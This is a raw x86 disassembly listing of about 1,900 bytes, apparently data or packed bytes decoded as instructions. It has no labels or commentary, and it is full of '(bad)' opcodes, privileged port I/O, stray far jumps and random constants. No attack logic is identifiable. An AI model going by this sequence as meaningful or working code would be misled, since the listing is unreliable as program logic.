  41ed68:	mov    eax,ds:0x84a14082
  41ed6d:	loopne 0x41ed03
  41ed6f:	ds ror al,0xc4
  41ed73:	inc    eax
  41ed74:	push   ecx
  41ed75:	add    BYTE PTR [bx+si+0x5],bl
  41ed79:	inc    ebp
  41ed7a:	or     al,0x39
  41ed7c:	adc    eax,0x62a62981
  41ed81:	ret    0x4bdc
  41ed84:	adc    eax,0x8e13c9c9
  41ed89:	cmc    
  41ed8a:	add    eax,0x3f470468
  41ed8f:	xor    DWORD PTR [edi],ebp
  41ed91:	rcl    BYTE PTR [bx+si],1
  41ed94:	and    al,0xbc
  41ed96:	rcr    BYTE PTR [edi-0x51],cl
  41ed99:	scas   al,BYTE PTR es:[edi]
  41ed9a:	nop
  41ed9b:	adc    al,0x78
  41ed9d:	ins    BYTE PTR es:[edi],dx
  41ed9e:	pop    ebp
  41ed9f:	sub    bl,dl
  41eda1:	push   0xfffffffa
  41eda3:	sar    BYTE PTR [edx+ebx*4-0x11f1b441],1
  41edaa:	pop    esi
  41edab:	pop    ss
  41edac:	sub    al,0xdb
  41edae:	in     al,0x76
  41edb0:	sbb    dl,BYTE PTR [edi-0x2d]
  41edb3:	or     al,0x54
  41edb5:	aad    0x52
  41edb7:	fcmovnbe st,st(2)
  41edb9:	pop    edx
  41edba:	jne    0x41ed63
  41edbc:	icebp  
  41edbd:	ins    DWORD PTR es:[edi],dx
  41edbe:	jmp    0x41ed91
  41edc0:	sbb    eax,0x2abf3741
  41edc5:	xchg   edx,eax
  41edc6:	push   edx
  41edc7:	cmp    eax,0xdbeeee9f
  41edcc:	mov    edi,0xfbd419c2
  41edd1:	push   esp
  41edd2:	cmp    ecx,0xffffffe6
  41edd5:	ret    0xa60c
  41edd8:	scas   eax,DWORD PTR es:[edi]
  41edd9:	out    0x8c,al
  41eddb:	aam    0xec
  41eddd:	lods   eax,DWORD PTR ds:[esi]
  41edde:	stc    
  41eddf:	mov    al,0xbf
  41ede1:	lods   eax,DWORD PTR ds:[esi]
  41ede2:	xchg   edx,eax
  41ede3:	popa   
  41ede4:	leave  
  41ede5:	and    al,BYTE PTR [edx-0x5e86e798]
  41edeb:	and    bl,ah
  41eded:	xchg   edi,eax
  41edee:	aas    
  41edef:	stos   BYTE PTR es:[edi],al
  41edf0:	ss loope 0x41ee37
  41edf3:	arpl   WORD PTR [ebp-0x26],cx
  41edf6:	mov    ebx,0x9748cbb0
  41edfb:	adc    BYTE PTR [edi],al
  41edfd:	je     0x41edf3
  41edff:	or     eax,0xae704122
  41ee04:	sti    
  41ee05:	pop    esp
  41ee06:	adc    eax,0xc0c9be7d
  41ee0b:	xchg   ecx,eax
  41ee0c:	push   ss
  41ee0d:	clc    
  41ee0e:	xchg   esi,eax
  41ee0f:	jmp    0x41ee59
  41ee11:	pop    esp
  41ee12:	adc    al,0x33
  41ee14:	or     DWORD PTR [ebp+0x46],edx
  41ee17:	lahf   
  41ee18:	and    bh,BYTE PTR [edi]
  41ee1a:	in     eax,0x78
  41ee1c:	hlt    
  41ee1d:	and    DWORD PTR [ecx+0x3a6443db],esp
  41ee23:	out    dx,al
  41ee24:	das    
  41ee25:	dec    esp
  41ee26:	addr16 retf 0xb51d
  41ee2a:	mov    al,0x4a
  41ee2c:	push   ebx
  41ee2d:	jl     0x41ee85
  41ee2f:	adc    BYTE PTR [ecx-0x5acd00d4],dl
  41ee35:	nop
  41ee36:	aas    
  41ee37:	jmp    0xab6e51fc
  41ee3c:	call   FWORD PTR [eax+ebx*4-0xc1fcc48]
  41ee43:	lea    ebx,ds:0xc9a47fb4
  41ee49:	mov    esi,0x9adec607
  41ee4e:	outs   dx,BYTE PTR ds:[esi]
  41ee4f:	les    esp,FWORD PTR [ebx-0x425909e6]
  41ee55:	push   edi
  41ee56:	jbe    0x41ee22
  41ee58:	repz movsx ebp,WORD PTR [edi]
  41ee5c:	aam    0x80
  41ee5e:	add    ecx,DWORD PTR [ebx]
  41ee60:	jge    0x41ee2d
  41ee62:	aad    0xbd
  41ee64:	inc    esi
  41ee65:	and    dl,BYTE PTR [edi-0x31]
  41ee68:	xchg   ecx,eax
  41ee69:	scas   al,BYTE PTR es:[edi]
  41ee6a:	mov    dh,0x26
  41ee6c:	adc    ebx,edx
  41ee6e:	and    al,0x54
  41ee70:	xchg   edx,eax
  41ee71:	sub    ecx,DWORD PTR [ecx+edx*8]
  41ee74:	cmp    al,0xe7
  41ee76:	and    al,0xe
  41ee78:	or     BYTE PTR [ebx+0x19526db3],al
  41ee7e:	and    esp,DWORD PTR [ebp-0x3]
  41ee81:	sar    BYTE PTR [ebx-0x22544cbc],0x3d
  41ee88:	mov    ebx,0xf0204ad
  41ee8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee8e:	xlat   BYTE PTR ds:[ebx]
  41ee8f:	jp     0x41ee9e
  41ee91:	dec    edi
  41ee92:	push   ecx
  41ee93:	xchg   ebx,eax
  41ee94:	test   eax,0x56cf1a9d
  41ee99:	sbb    eax,0xe745bd72
  41ee9e:	jno    0x41ee90
  41eea0:	cmp    bl,al
  41eea2:	sahf   
  41eea3:	int    0x7
  41eea5:	lds    ebp,FWORD PTR [eax]
  41eea7:	sbb    ebp,DWORD PTR [edi-0x9]
  41eeaa:	or     bh,BYTE PTR ds:0x53342939
  41eeb0:	test   al,0x44
  41eeb2:	push   0xfffffff7
  41eeb4:	dec    ecx
  41eeb5:	scas   eax,DWORD PTR es:[edi]
  41eeb6:	cld    
  41eeb7:	push   esp
  41eeb8:	or     eax,0x121a3e46
  41eebd:	js     0x41eee9
  41eebf:	push   0x4e
  41eec1:	shr    BYTE PTR [esp+eax*4-0x6f3f24eb],cl
  41eec8:	sti    
  41eec9:	xchg   ebx,eax
  41eeca:	test   BYTE PTR [eax+0x55],ch
  41eecd:	and    BYTE PTR [ebp+0x2a],al
  41eed0:	in     al,dx
  41eed1:	lea    esi,[edi-0x24a379ab]
  41eed7:	xlat   BYTE PTR ds:[ebx]
  41eed8:	jae    0x41eea0
  41eeda:	mov    eax,ds:0x201b3b17
  41eedf:	bnd js 0x41ee8d
  41eee2:	push   edx
  41eee3:	xor    esp,edi
  41eee5:	popf   
  41eee6:	fidiv  DWORD PTR [eax+0x74a4ba5e]
  41eeec:	push   esi
  41eeed:	mov    DWORD PTR [ebx+0x48b1f6dc],eax
  41eef3:	mov    esp,0x4a39c182
  41eef8:	xor    al,0xce
  41eefa:	xor    edx,0xffffffc3
  41eefd:	scas   eax,DWORD PTR es:[edi]
  41eefe:	jmp    0x759f5063
  41ef03:	cmp    esp,DWORD PTR [edx]
  41ef05:	cld    
  41ef06:	std    
  41ef07:	iret   
  41ef08:	inc    esp
  41ef09:	shl    DWORD PTR [esi-0x42aec89c],0x58
  41ef10:	dec    eax
  41ef11:	ret    
  41ef12:	loop   0x41ef61
  41ef14:	das    
  41ef15:	lea    ecx,[ebp-0x43]
  41ef18:	adc    esi,DWORD PTR [ebx]
  41ef1a:	test   al,0xf9
  41ef1c:	out    dx,al
  41ef1d:	(bad)  
  41ef1e:	inc    ebp
  41ef1f:	mov    ah,0xe5
  41ef21:	add    ebx,DWORD PTR [edx+0x673c98d7]
  41ef27:	push   ds
  41ef28:	or     al,0x59
  41ef2a:	js     0x41eed4
  41ef2c:	out    0xec,eax
  41ef2e:	xchg   DWORD PTR [ebx-0x7c],ebp
  41ef31:	mov    eax,ds:0xdec736ac
  41ef36:	xchg   di,ax
  41ef38:	test   DWORD PTR [edx-0x1498d439],ebp
  41ef3e:	scas   al,BYTE PTR es:[edi]
  41ef3f:	mov    esp,eax
  41ef41:	outs   dx,DWORD PTR ds:[esi]
  41ef42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef43:	mov    esp,0xa76ce71e
  41ef48:	mov    ds:0x64cea957,eax
  41ef4d:	mov    ecx,0xd7b2bf2f
  41ef52:	mul    BYTE PTR [eax-0xe]
  41ef55:	mov    eax,ds:0x85284368
  41ef5a:	xchg   ebx,eax
  41ef5b:	(bad)  
  41ef5c:	out    dx,eax
  41ef5d:	test   ecx,ebp
  41ef5f:	sub    cl,0x3e
  41ef62:	inc    edx
  41ef63:	sub    eax,0x4c1a994e
  41ef68:	xchg   ebp,eax
  41ef69:	push   0xffffff9d
  41ef6b:	sub    dh,BYTE PTR [edx-0x3eebfd7b]
  41ef71:	cmp    al,0x93
  41ef73:	pop    eax
  41ef74:	inc    esi
  41ef75:	shl    DWORD PTR fs:[edx+edx*4-0x60751ac0],1
  41ef7d:	dec    esp
  41ef7e:	mov    ebx,ecx
  41ef80:	cmp    ah,dh
  41ef82:	pop    ebx
  41ef83:	xor    edi,DWORD PTR [eax+0x57]
  41ef86:	xchg   ebx,eax
  41ef87:	and    esp,DWORD PTR [ecx+0x633ba6dd]
  41ef8d:	add    DWORD PTR [edi],0xfffffff3
  41ef90:	and    BYTE PTR [eax+0x2cdcc67a],0xc8
  41ef97:	shl    DWORD PTR [eax+ebp*2+0x59e0044c],0x16
  41ef9f:	arpl   bp,ax
  41efa1:	jge    0x41ef66
  41efa3:	mov    ah,0xd3
  41efa5:	sub    eax,0x6b9f3e6f
  41efaa:	les    ecx,FWORD PTR [ebx+0x536c94b5]
  41efb0:	(bad)  
  41efb1:	jno    0x41efb4
  41efb3:	sbb    eax,0x4b633fed
  41efb8:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41efba:	ds push ebx
  41efbc:	scas   eax,DWORD PTR es:[edi]
  41efbd:	fldcw  WORD PTR [ebp+0x32]
  41efc0:	daa    
  41efc1:	adc    BYTE PTR [ebx+0x4e],0x83
  41efc5:	fbstp  TBYTE PTR [edi+0x3754d800]
  41efcb:	inc    edx
  41efcc:	test   al,0x4e
  41efce:	sub    ebp,DWORD PTR [ebx+edi*8-0x6663334a]
  41efd5:	add    eax,0x52808759
  41efda:	out    0x80,al
  41efdc:	push   eax
  41efdd:	cmp    BYTE PTR [edi+0x12],ah
  41efe0:	scas   eax,DWORD PTR es:[edi]
  41efe1:	cli    
  41efe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efe3:	lea    edi,[edi+0x2b]
  41efe6:	xor    ebp,edx
  41efe8:	lahf   
  41efe9:	ret    
  41efea:	cs xchg ebx,eax
  41efec:	imul   ecx,esp,0x78b18a1a
  41eff2:	jb     0x41f051
  41eff4:	loope  0x41f005
  41eff6:	mov    ch,0x54
  41eff8:	inc    ebp
  41eff9:	and    DWORD PTR [ebx-0x77],esi
  41effc:	div    DWORD PTR [ecx]
  41effe:	pminub mm4,QWORD PTR [edi]
  41f001:	or     al,0xff
  41f003:	jp     0x41f084
  41f005:	bt     DWORD PTR ds:0x8d4c,ecx
  41f00b:	loopne 0x41efc9
  41f00d:	sub    eax,DWORD PTR [ecx-0x7ca2a24e]
  41f013:	push   eax
  41f014:	nop
  41f015:	or     al,0x11
  41f017:	test   al,0xea
  41f019:	shr    ebx,0x34
  41f01c:	cmc    
  41f01d:	nop
  41f01e:	lods   al,BYTE PTR ds:[esi]
  41f01f:	xchg   DWORD PTR [edx+0x7f21b10d],eax
  41f025:	iret   
  41f026:	sbb    eax,0xcfbd4d01
  41f02b:	inc    ecx
  41f02c:	and    dl,BYTE PTR [eax]
  41f02e:	xor    eax,0x1ede5f99
  41f033:	mov    cl,0x60
  41f035:	jmp    0xeee5f537
  41f03a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f03b:	dec    edi
  41f03c:	and    al,0xbe
  41f03e:	pop    ecx
  41f03f:	cmp    edx,DWORD PTR [ecx-0x697ea6c1]
  41f045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f046:	out    0xc9,eax
  41f048:	xchg   BYTE PTR [ebx-0x62e42ea2],dl
  41f04e:	loopne 0x41efd7
  41f050:	xlat   BYTE PTR ds:[ebx]
  41f051:	nop
  41f052:	fsubr  DWORD PTR [ecx-0x69a8114b]
  41f058:	ror    DWORD PTR [ebp+0x588c92f],cl
  41f05e:	clc    
  41f05f:	cwde   
  41f060:	(bad)  
  41f061:	gs jns 0x41f03a
  41f064:	mov    bl,0x5f
  41f066:	sar    esp,1
  41f068:	ret    
  41f069:	push   edx
  41f06a:	xor    dh,BYTE PTR [ebx+edx*2+0x46b36530]
  41f071:	pop    ebx
  41f072:	cmp    al,0x23
  41f074:	xchg   BYTE PTR [edx-0x49],dl
  41f077:	adc    eax,0xc156cf2d
  41f07c:	leave  
  41f07d:	push   ebx
  41f07e:	xor    eax,0x5449ea3f
  41f083:	add    al,0x2a
  41f085:	arpl   ax,di
  41f087:	iret   
  41f088:	sbb    ebx,ecx
  41f08a:	aas    
  41f08b:	js     0x41f0b1
  41f08d:	jo     0x41f087
  41f08f:	add    al,0x4d
  41f091:	cld    
  41f092:	leave  
  41f093:	add    BYTE PTR [esi+0x40582d82],ah
  41f099:	or     ebp,0xfffffffe
  41f09c:	mov    DWORD PTR [ecx-0x15],ebp
  41f09f:	into   
  41f0a0:	pop    ss
  41f0a1:	stos   BYTE PTR es:[edi],al
  41f0a2:	dec    edx
  41f0a3:	mov    al,0x8a
  41f0a5:	retf   0x5fec
  41f0a8:	imul   ebp,DWORD PTR [esi-0x74],0x78bf53f
  41f0af:	adc    cl,BYTE PTR [edi-0x7]
  41f0b2:	inc    ebx
  41f0b3:	dec    eax
  41f0b4:	neg    BYTE PTR [ebp+0x75db94cb]
  41f0ba:	jmp    0x41f09e
  41f0bc:	pop    esp
  41f0bd:	pop    esp
  41f0be:	stos   DWORD PTR es:[edi],eax
  41f0bf:	or     BYTE PTR [esi+eiz*1-0x5d03e7ec],bl
  41f0c6:	add    esi,DWORD PTR [edx]
  41f0c8:	in     al,0xb
  41f0ca:	pop    ds
  41f0cb:	ficomp DWORD PTR [ebx-0x74]
  41f0ce:	jnp    0x41f0d6
  41f0d0:	mov    edx,0xc2df5f4b
  41f0d5:	pop    ebp
  41f0d6:	fcmovnu st,st(0)
  41f0d8:	mov    dl,0x39
  41f0da:	repz arpl WORD PTR [ecx-0x42],dx
  41f0de:	jae    0x41f0bb
  41f0e0:	out    dx,al
  41f0e1:	push   edx
  41f0e2:	mov    bh,0x53
  41f0e4:	add    bl,BYTE PTR [edi-0x7ba530e8]
  41f0ea:	dec    edx
  41f0eb:	add    esi,DWORD PTR [esi+0x618fb092]
  41f0f1:	outs   dx,BYTE PTR ds:[esi]
  41f0f2:	and    DWORD PTR [ecx+ebp*1],ecx
  41f0f5:	cmc    
  41f0f6:	jmp    0x9e86:0xe9e784f4
  41f0fd:	push   0xf76f38a6
  41f102:	xor    eax,0x5a58771c
  41f107:	and    BYTE PTR [eax+edx*2],bl
  41f10a:	iret   
  41f10b:	mov    cl,0xb5
  41f10d:	inc    esp
  41f10e:	(bad)  [ebx+ecx*1]
  41f111:	adc    edx,esi
  41f113:	adc    eax,0x525b0db6
  41f118:	out    dx,al
  41f119:	dec    esi
  41f11a:	je     0x41f137
  41f11c:	add    eax,0x47039014
  41f121:	mov    BYTE PTR [edx],0x1e
  41f124:	hlt    
  41f125:	pusha  
  41f126:	fistp  QWORD PTR [edi]
  41f128:	outs   dx,DWORD PTR ds:[esi]
  41f129:	cs pop edx
  41f12b:	mov    bl,0xd6
  41f12d:	dec    ebp
  41f12e:	scas   eax,DWORD PTR es:[edi]
  41f12f:	bound  ebp,QWORD PTR [ebx-0x56]
  41f132:	(bad)  
  41f133:	jge    0x41f0c0
  41f135:	mov    al,ds:0x6461f1ba
  41f13a:	mov    ch,0xf3
  41f13c:	mov    edx,DWORD PTR [esp+edx*1+0x3f]
  41f140:	pushf  
  41f141:	into   
  41f142:	xchg   ebx,eax
  41f143:	arpl   bx,sp
  41f145:	fimul  DWORD PTR [edx]
  41f147:	dec    esp
  41f148:	cmp    BYTE PTR [edi],dh
  41f14a:	and    BYTE PTR [ebx+0x7a],bh
  41f14d:	mov    edi,0x84cd0b04
  41f153:	dec    edx
  41f154:	popa   
  41f155:	jnp    0x41f15f
  41f157:	pusha  
  41f158:	mov    ch,0x41
  41f15a:	hlt    
  41f15b:	repnz inc DWORD PTR [edx]
  41f15e:	push   ebx
  41f15f:	jecxz  0x41f1c4
  41f161:	or     al,0x73
  41f163:	or     DWORD PTR [edx+0x3dd3dac9],esp
  41f169:	psubsb mm5,QWORD PTR [esp+edi*2-0x32]
  41f16e:	inc    ebp
  41f16f:	and    eax,0x9150a6ca
  41f174:	xchg   esi,eax
  41f175:	popf   
  41f176:	stos   BYTE PTR es:[edi],al
  41f177:	or     bl,0xe3
  41f17a:	push   es
  41f17b:	cmp    eax,0x6a917662
  41f180:	inc    esp
  41f181:	ret    
  41f182:	(bad)  
  41f183:	pop    esp
  41f184:	jle    0x41f1bf
  41f186:	fucomip st,st(5)
  41f188:	ror    BYTE PTR [ebp-0x9],0x62
  41f18c:	mov    ebp,DWORD PTR [edx]
  41f18e:	push   ds
  41f18f:	fdivp  st(0),st
  41f191:	jle    0x41f116
  41f193:	push   eax
  41f194:	mov    BYTE PTR [edx*4-0x70ccb778],0xa8
  41f19c:	jge    0x41f174
  41f19e:	shl    DWORD PTR [ecx+0x33],1
  41f1a1:	call   0x4bff635c
  41f1a6:	sbb    esi,edi
  41f1a8:	mov    eax,ds:0xf8fc18f
  41f1ad:	ret    0xe898
  41f1b0:	inc    ebx
  41f1b1:	mov    ah,0x46
  41f1b3:	jecxz  0x41f1d7
  41f1b5:	in     al,dx
  41f1b6:	loop   0x41f1b1
  41f1b8:	mov    BYTE PTR [eax-0x75dfcac],dl
  41f1be:	adc    ch,BYTE PTR [ecx]
  41f1c0:	iret   
  41f1c1:	pop    ds
  41f1c2:	mov    ds:0xfe5aab71,al
  41f1c7:	test   eax,0x7a748388
  41f1cc:	push   es
  41f1cd:	or     al,0x84
  41f1cf:	imul   edx,esi,0x4b
  41f1d2:	adc    eax,0xd0692bbb
  41f1d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1d8:	push   edx
  41f1d9:	xlat   BYTE PTR ds:[ebx]
  41f1da:	retf   0xbf33
  41f1dd:	dec    esi
  41f1de:	in     al,dx
  41f1df:	retf   0x47d9
  41f1e2:	sub    DWORD PTR [edx+ebx*4],esp
  41f1e5:	mov    ebx,0x9ba13bec
  41f1ea:	loope  0x41f1d6
  41f1ec:	and    eax,0xef8f0a9f
  41f1f1:	call   0x1b23:0x707517ef
  41f1f8:	or     bl,ch
  41f1fa:	mov    ah,0x25
  41f1fc:	sub    ebx,edx
  41f1fe:	xchg   ebp,eax
  41f1ff:	popf   
  41f200:	xchg   ebp,eax
  41f201:	push   ss
  41f202:	dec    esp
  41f203:	in     eax,0x40
  41f205:	iret   
  41f206:	xor    DWORD PTR [eax+0x7517468d],esp
  41f20c:	and    al,0x66
  41f20e:	or     eax,0xcb3dcd11
  41f213:	or     BYTE PTR [edx+ecx*1],cl
  41f216:	popa   
  41f217:	loop   0x41f21e
  41f219:	popa   
  41f21a:	fwait
  41f21b:	sub    DWORD PTR [ecx+0x78],0x14
  41f21f:	inc    esp
  41f220:	das    
  41f221:	fxch   st(2)
  41f223:	xchg   BYTE PTR ds:0x7e0aae5e,cl
  41f229:	ror    DWORD PTR [ebp+0x2d5bc9f9],cl
  41f22f:	test   al,0xce
  41f231:	mov    eax,ds:0x50ce867b
  41f236:	inc    ebp
  41f237:	(bad)  
  41f238:	aad    0xda
  41f23a:	push   eax
  41f23b:	sbb    al,0xfb
  41f23d:	cdq    
  41f23e:	adc    dl,BYTE PTR [eax]
  41f240:	jae    0x41f215
  41f242:	xor    esi,DWORD PTR [eax+0x4b]
  41f245:	dec    ebp
  41f246:	inc    ecx
  41f247:	xor    esi,DWORD PTR [edx-0x1de730cd]
  41f24d:	jl     0x41f24b
  41f24f:	sahf   
  41f250:	outs   dx,DWORD PTR ds:[esi]
  41f251:	sub    eax,0xf1c5ebae
  41f256:	retf   
  41f257:	frstor [ecx-0x723d3f1c]
  41f25d:	clc    
  41f25e:	les    ebp,FWORD PTR [ebp+0x14]
  41f261:	ss in  al,0xa9
  41f264:	outs   dx,DWORD PTR ds:[esi]
  41f265:	ret    0x1cc5
  41f268:	jbe    0x41f2c9
  41f26a:	jae    0x41f2c9
  41f26c:	or     esi,DWORD PTR [eax]
  41f26e:	int3   
  41f26f:	sti    
  41f270:	xor    DWORD PTR [ebx-0x5629c0c8],eax
  41f276:	adc    edi,DWORD PTR [esi]
  41f278:	pop    ecx
  41f279:	mov    bh,0xfe
  41f27b:	mov    ecx,0xadbd6f69
  41f280:	out    dx,al
  41f281:	es pop edi
  41f283:	xchg   ch,dl
  41f285:	pop    edx
  41f286:	xchg   esp,eax
  41f287:	or     ch,BYTE PTR [eax]
  41f289:	cli    
  41f28a:	and    ebp,DWORD PTR [ebp+0x71]
  41f28d:	aaa    
  41f28e:	imul   eax,esi,0xe35014c1
  41f294:	xchg   esi,eax
  41f295:	lods   eax,DWORD PTR ds:[esi]
  41f296:	imul   esi,DWORD PTR [ecx+0x596bbc71],0x87ac96e3
  41f2a0:	push   ds
  41f2a1:	xchg   esi,eax
  41f2a2:	push   es
  41f2a3:	or     al,0x8b
  41f2a5:	arpl   WORD PTR [ebx-0x53fe0263],dx
  41f2ab:	pop    ds
  41f2ac:	sbb    eax,0x47c44e61
  41f2b1:	xor    esp,DWORD PTR [ecx+0x51d3f541]
  41f2b7:	mov    cl,0x6a
  41f2b9:	lds    esp,FWORD PTR [esi+0x2c]
  41f2bc:	je     0x41f291
  41f2be:	popf   
  41f2bf:	add    DWORD PTR [edi+0x4a7b6d15],edi
  41f2c5:	xcrypt-ecb (bad)
  41f2c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2c7:	mov    dh,BYTE PTR [ebx+0x31328792]
  41f2cd:	in     al,0x91
  41f2cf:	aam    0x6b
  41f2d1:	nop
  41f2d2:	push   ebp
  41f2d3:	mov    esi,DWORD PTR [edi+0x59]
  41f2d6:	xor    al,0x89
  41f2d8:	and    al,0x4e
  41f2da:	jno    0x41f32b
  41f2dc:	xchg   ebp,eax
  41f2dd:	inc    esp
  41f2de:	ror    BYTE PTR [ebx],0x63
  41f2e1:	sbb    al,0x5f
  41f2e3:	pushf  
  41f2e4:	outs   dx,BYTE PTR ds:[esi]
  41f2e5:	je     0x41f2b8
  41f2e7:	xor    al,0x77
  41f2e9:	xor    ebp,ebx
  41f2eb:	inc    edi
  41f2ec:	leave  
  41f2ed:	pop    esp
  41f2ee:	jbe    0x41f325
  41f2f0:	retf   0x163c
  41f2f3:	sbb    ah,BYTE PTR [ebx-0x7a]
  41f2f6:	adc    al,0x7e
  41f2f8:	push   edi
  41f2f9:	and    al,0xc1
  41f2fb:	lahf   
  41f2fc:	sti    
  41f2fd:	sub    BYTE PTR [ecx-0x7a],ah
  41f300:	jp     0x41f2b5
  41f302:	dec    ebp
  41f303:	mov    esi,0x604bb1
  41f308:	xlat   BYTE PTR ds:[ebx]
  41f309:	ds pusha 
  41f30b:	xchg   DWORD PTR ss:[ecx+0x3269e980],ecx
  41f312:	or     DWORD PTR [ebp-0x7],0x7f16cc76
  41f319:	mov    eax,0x21d67220
  41f31e:	cs pause 
  41f321:	push   esp
  41f322:	call   0x36306fe6
  41f327:	dec    esp
  41f328:	push   edi
  41f329:	adc    al,0x82
  41f32b:	pop    ecx
  41f32c:	(bad)  
  41f32d:	jg     0x41f3a8
  41f32f:	out    dx,al
  41f330:	mov    dh,0x24
  41f332:	jnp    0x41f339
  41f334:	push   ebx
  41f335:	xchg   ebx,eax
  41f336:	call   0xb38e:0x63dd4772
  41f33d:	pop    eax
  41f33e:	mov    bl,0x83
  41f340:	imul   edx,DWORD PTR [edx+edx*1-0x45331b34],0x75f36f66
  41f34b:	fwait
  41f34c:	and    DWORD PTR [eax-0x39474b4f],edi
  41f352:	xor    DWORD PTR [ebp+0x678e24fe],eax
  41f358:	cmp    eax,0xfc60a17e
  41f35d:	xor    al,0x56
  41f35f:	mov    ebx,0x1fe6975
  41f364:	lods   al,BYTE PTR ds:[esi]
  41f365:	dec    ebp
  41f366:	into   
  41f367:	inc    esi
  41f368:	adc    BYTE PTR [eax+edi*1],ch
  41f36b:	retf   0xc75a
  41f36e:	mov    WORD PTR [esi+ebp*4],gs
  41f371:	mov    edx,0x26484753
  41f376:	leave  
  41f377:	loop   0x41f34c
  41f379:	jp     0x41f347
  41f37b:	pop    esi
  41f37c:	shr    BYTE PTR [ebx],0x83
  41f37f:	scas   al,BYTE PTR es:[edi]
  41f380:	sbb    DWORD PTR [edi-0x28fd3075],ebx
  41f386:	imul   ebp,DWORD PTR [esp+esi*1],0xffffffb7
  41f38a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f38b:	or     BYTE PTR [ebx-0x20fa571],bh
  41f391:	shr    BYTE PTR [eax],1
  41f393:	and    BYTE PTR [ebx],ch
  41f395:	mov    ds:0xb978e1b1,eax
  41f39a:	xor    al,0xe
  41f39c:	mov    esp,0x3d96405f
  41f3a1:	stos   DWORD PTR es:[edi],eax
  41f3a2:	push   edx
  41f3a3:	fcomp  DWORD PTR [esi+0x2280da78]
  41f3a9:	cmp    cl,BYTE PTR [esi+0x5d]
  41f3ac:	fdivr  DWORD PTR [ecx]
  41f3ae:	cwde   
  41f3af:	or     dh,ah
  41f3b1:	inc    esp
  41f3b2:	push   cs
  41f3b3:	fisubr WORD PTR [edx-0x56]
  41f3b6:	sub    esi,DWORD PTR [edi-0x32f8a87f]
  41f3bc:	loop   0x41f36e
  41f3be:	in     eax,0xa
  41f3c0:	mov    BYTE PTR ds:0x6f5cabe8,ah
  41f3c6:	idiv   edi
  41f3c8:	lock stos DWORD PTR es:[edi],eax
  41f3ca:	mov    edx,gs
  41f3cc:	leave  
  41f3cd:	add    ecx,edi
  41f3cf:	sbb    ch,BYTE PTR [ebx+0x441a62e1]
  41f3d5:	mov    DWORD PTR [ebx],edi
  41f3d7:	xchg   esp,eax
  41f3d8:	mov    bl,0xa0
  41f3da:	outs   dx,DWORD PTR ds:[esi]
  41f3db:	dec    esp
  41f3dc:	cmp    eax,0x13a4f59
  41f3e1:	mov    ecx,0x7643b8c4
  41f3e6:	sub    eax,esp
  41f3e8:	test   eax,0x870c613b
  41f3ed:	icebp  
  41f3ee:	scas   al,BYTE PTR es:[edi]
  41f3ef:	lods   al,BYTE PTR ds:[esi]
  41f3f0:	pop    esp
  41f3f1:	sbb    eax,0x8be0fbb8
  41f3f6:	add    edi,DWORD PTR [eax+0x3cb6ec4]
  41f3fc:	lock (bad) 
  41f3fe:	pusha  
  41f3ff:	mov    edx,0x8af1db23
  41f404:	or     bl,BYTE PTR [ecx+0x5d32d15b]
  41f40a:	mov    al,ds:0xd8237dc5
  41f40f:	aas    
  41f410:	or     BYTE PTR [eax],bl
  41f412:	sub    DWORD PTR [ebx],edi
  41f414:	dec    esi
  41f415:	sub    ch,BYTE PTR [edi+0x29]
  41f418:	stos   DWORD PTR es:[edi],eax
  41f419:	bound  eax,QWORD PTR [eax]
  41f41b:	cmp    dl,0x34
  41f41e:	in     al,dx
  41f41f:	jmp    0x41f3a1
  41f421:	mov    ebx,0x2d432fdc
  41f426:	push   es
  41f427:	sbb    esp,edx
  41f429:	mov    cs,WORD PTR [eax+0x3b]
  41f42c:	cwde   
  41f42d:	popa   
  41f42e:	xchg   DWORD PTR [edi],esi
  41f430:	or     ch,BYTE PTR [edx+0x241923e8]
  41f436:	iret   
  41f437:	mov    ebx,0x4296c5d2
  41f43c:	dec    ebp
  41f43d:	and    al,0x4e
  41f43f:	jg     0x41f476
  41f441:	push   edi
  41f442:	push   ss
  41f443:	xor    BYTE PTR [ecx],ah
  41f445:	(bad)  
  41f446:	jmp    0x9855:0xf8d882d
  41f44d:	xchg   ah,bh
  41f44f:	push   edx
  41f450:	stos   DWORD PTR es:[edi],eax
  41f451:	mov    ds:0x2469b72d,al
  41f456:	push   ecx
  41f457:	les    ecx,FWORD PTR [edx+0x500386d2]
  41f45d:	jne    0x41f4bb
  41f45f:	dec    esi
  41f460:	mov    edi,0xa05948d5
  41f465:	xchg   esp,eax
  41f466:	jb     0x41f4b7
  41f468:	inc    esi
  41f469:	push   ecx
  41f46a:	mov    BYTE PTR [ebx-0xb9dd8d6],bl
  41f470:	lock mov ah,0x8d
  41f473:	mov    ss:0x140839b4,al
  41f479:	sar    DWORD PTR cs:[ecx+0x10],1
  41f47d:	jnp    0x8b97505e
  41f483:	add    edi,edi
  41f485:	mov    al,0xd0
  41f487:	arpl   WORD PTR [ebp+0x76],sp
  41f48a:	push   ecx
  41f48b:	int    0x79
  41f48d:	inc    ecx
  41f48e:	lea    edi,[edi]
  41f490:	(bad)  
  41f491:	xor    cl,BYTE PTR [ecx+0x26]
  41f494:	bound  edx,QWORD PTR [esi+0x5dce4b38]
  41f49a:	outs   dx,DWORD PTR ds:[esi]
  41f49b:	sbb    eax,0xa6eebaa5
  41f4a0:	mov    DWORD PTR [edi],ecx
  41f4a2:	sub    DWORD PTR [ecx-0x26],ecx
  41f4a5:	cmp    ecx,DWORD PTR [edx-0x4d3edb4d]
  41f4ab:	adc    DWORD PTR [ebx],edx
  41f4ad:	inc    esp
  41f4ae:	inc    edx
  41f4af:	push   esp
  41f4b0:	in     al,0x96
  41f4b2:	in     eax,dx
  41f4b3:	mov    al,ds:0x1d7a915b
  41f4b8:	(bad)  
  41f4b9:	fcmovu st,st(5)
  41f4bb:	sub    dh,bh
  41f4bd:	add    edx,esi
  41f4bf:	xor    eax,0x14e3d4fe
  41f4c4:	jge    0x41f4a1
  41f4c6:	dec    esp
  41f4c7:	inc    ecx
  41f4c8:	push   0xffffffad
  41f4ca:	popa   
  41f4cb:	xor    DWORD PTR [ebx],edi
